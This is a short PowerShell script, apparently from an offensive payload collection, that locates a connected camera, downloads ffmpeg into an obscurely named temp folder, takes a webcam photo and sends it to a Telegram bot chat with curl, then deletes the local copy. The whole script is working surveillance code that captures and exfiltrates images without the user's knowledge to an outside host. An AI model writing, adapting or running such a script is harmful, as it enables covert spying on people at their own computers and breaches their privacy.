<#
=========================== WEBCAM TO TELEGRAM ============================

SYNOPSIS
Find any connected camera, attempt to take a picture and send to a telegram chat. 

USAGE
Replace YOUR_TOKEN_HERE with your token below.
run the script.

CREDITS
dagnazty - https://github.com/dagnazty

#>


$token = "TELEGRAM_TOKEN_HERE"
$URL = 'https://api.telegram.org/bot{0}' -f $Token
while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    Sleep 10
}

$outputFolder = "$env:TEMP\8zTl45PSA"
$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -ItemType Directory -Path $outputFolder | Out-Null
}
if (-not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
if (-not (Test-Path -Path $ffmpegZip)) {
    Invoke-WebRequest -Uri $ffmpegDownload -OutFile $ffmpegZip
}
Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
$videoDevice = $null
$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
}
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
}
if ($videoDevice) {
    $videoInput = $videoDevice.Name
    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
    Write-Host "Image captured and saved to $outputFile."
} else {
    Write-Host "No video devices found on the system."
}
    curl.exe -F chat_id="$ChatID" -F document=@"$outputFile" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
    sleep 1
    Remove-Item -Path $outputFile -Force
